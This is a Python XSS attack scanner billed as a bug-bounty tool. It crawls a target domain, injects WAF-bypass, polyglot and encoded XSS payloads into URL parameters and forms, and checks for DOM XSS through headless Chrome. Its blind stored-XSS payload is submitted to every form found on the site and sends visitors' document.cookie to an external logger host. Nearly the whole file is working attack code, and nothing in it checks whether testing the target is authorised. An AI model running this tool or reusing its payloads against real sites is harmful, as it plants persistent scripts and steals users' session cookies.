import requests
import urllib.parse
import random
import string
import concurrent.futures
import time
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
import time as t

# Use with care and Ethical purpose only.
# Created and credits to WhoamiGroot.
# Do Not Remove!!!
# Python3

print('''
██╗░░██╗░██████╗░██╗░░░░░░░░░░░██╗░░██╗░██████╗░██████╗
╚██╗██╔╝██╔═══██╗██║░░░░░░░░░░░╚██╗██╔╝██╔════╝██╔════╝
░╚███╔╝░██║██╗██║██║░░░░░█████╗░╚███╔╝░╚█████╗░╚█████╗░
░██╔██╗░╚██████╔╝██║░░░░░╚════╝░██╔██╗░░╚═══██╗░╚═══██╗
██╔╝╚██╗░╚═██╔═╝░███████╗░░░░░░██╔╝╚██╗██████╔╝██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░
Created by: WhoamiGroot                                               
'''
) 

# Blind XSS Webhook (Use your Burp Collaborator or your own XSS Logger)
BLIND_XSS_SERVER = "http://your-xss-logger.com/log"  # Replace with your logger

# Generate a random string (for unique payloads)
def random_string(length=5):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# XSS Payloads (WAF Bypass, Polyglot, Blind XSS, CSP Bypass)
waf_bypass_payloads = [
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<script>Object.constructor('alert(1)')()</script>",
    "<a href=javascript:'\u0061\u006C\u0065\u0072\u0074(1)'>Click</a>",
    "<input autofocus onfocus=alert(1)>"
]

polyglot_payloads = [
    "\"><script>alert(1)</script>",
    "';alert(1);//",
    "<svg><script>alert(1)</script></svg>",
    "javascript:/*--*/alert(1)//"
]

blind_xss_payload = f'<script>new Image().src="{BLIND_XSS_SERVER}?data="+document.cookie</script>'

# Encode payloads to bypass filters
def encode_payload(payload):
    return [
        payload,
        ''.join([f'&#{ord(c)};' for c in payload]),
        ''.join([f'\\x{hex(ord(c))[2:].zfill(2)}' for c in payload]),
        urllib.parse.quote(payload)
    ]

# Extract forms from a page
def get_forms(url):
    try:
        response = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
        response.raise_for_status()  # Raise an exception for 4xx/5xx responses
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching forms from {url}: {e}")
        return []

# Extract form details
def form_details(form):
    return {
        "action": form.attrs.get("action", ""),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": [{"name": i.attrs.get("name"), "type": i.attrs.get("type", "text")} for i in form.find_all("input")]
    }

# Submit form with XSS payload
def submit_form(form_details, url, payload):
    target_url = urllib.parse.urljoin(url, form_details["action"])
    data = {i["name"]: payload for i in form_details["inputs"] if i["name"]}
    headers = {"User-Agent": "Mozilla/5.0"}
    
    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data, headers=headers)
        else:
            response = requests.get(target_url, params=data, headers=headers)
        response.raise_for_status()  # Ensure no HTTP errors occur
    except requests.exceptions.RequestException as e:
        print(f"Error submitting form to {url}: {e}")

# Log results to both JSON and TXT files
def log_result(message):
    # Log to JSON file
    with open("xss_results.json", "a") as json_file:
        json.dump({"result": message}, json_file, indent=4)
        json_file.write(",\n")  # Ensure each log is on a new line in JSON

    # Log to TXT file
    with open("xss_results.txt", "a") as txt_file:
        txt_file.write(f"{message}\n")  # Append the message with a newline in TXT

# Test XSS via URL parameters
def test_xss(param, url, payload):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    query_params[param] = payload
    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?" + urllib.parse.urlencode(query_params, doseq=True)
    
    print(f"Testing: {test_url}")
    try:
        response = requests.get(test_url, headers={"User-Agent": "Mozilla/5.0"})
        response.raise_for_status()  # Handle HTTP errors
        if payload in response.text:
            result = f"[!] XSS found in {param} | Payload: {payload} | URL: {test_url}"
            print(result)
            log_result(result)
    except requests.exceptions.RequestException as e:
        print(f"Error testing XSS on {test_url}: {e}")

# Scan for DOM-based XSS using Selenium
def scan_dom_xss(url):
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)
    dom_payloads = ["#<script>alert('DOM XSS')</script>", "#\"><img src=x onerror=alert('DOM XSS')>"]
    
    for payload in dom_payloads:
        driver.get(url + payload)
        if "alert('DOM XSS')" in driver.page_source:
            log_result(f"DOM XSS found: {url}{payload}")
            print(f"[!] DOM XSS found: {url}{payload}")
    driver.quit()

# Scan for XSS vulnerabilities
def scan_xss(url):
    all_payloads = waf_bypass_payloads + polyglot_payloads + [blind_xss_payload]
    encoded_payloads = [enc for p in all_payloads for enc in encode_payload(p)]
    
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        for param in query_params.keys():
            for payload in encoded_payloads:
                executor.submit(test_xss, param, url, payload)

# Scan stored XSS
def scan_stored_xss(url):
    for form in get_forms(url):
        details = form_details(form)
        print(f"Submitting Stored XSS to: {details['action']}")
        submit_form(details, url, blind_xss_payload)
        time.sleep(5)  # Sleep to avoid overwhelming the server
        if blind_xss_payload in requests.get(url).text:
            log_result(f"Stored XSS found at: {url}")

# Crawl and scan a domain
def crawl_and_scan(domain):
    visited, to_visit = set(), {domain}
    while to_visit:
        url = to_visit.pop()
        if url in visited:
            continue
        print(f"Crawling: {url}")
        visited.add(url)
        
        # Ensure that the URL is within the target domain
        if urllib.parse.urlparse(url).netloc == urllib.parse.urlparse(domain).netloc:
            scan_xss(url)
            scan_dom_xss(url)
            scan_stored_xss(url)

            # Parse the page and add new links to the crawl queue
            try:
                response = requests.get(url)
                response.raise_for_status()
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all("a", href=True):
                    link_url = urllib.parse.urljoin(url, link["href"])
                    if urllib.parse.urlparse(link_url).netloc == urllib.parse.urlparse(domain).netloc and link_url not in visited:
                        to_visit.add(link_url)
            except requests.exceptions.RequestException as e:
                print(f"Error crawling {url}: {e}")

        # Sleep to avoid too many rapid requests
        time.sleep(3)

# Main Execution
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Advanced XSS Scanner for Bug Bounty Hunting")
    parser.add_argument("url", help="Target URL")
    args = parser.parse_args()
    crawl_and_scan(args.url)

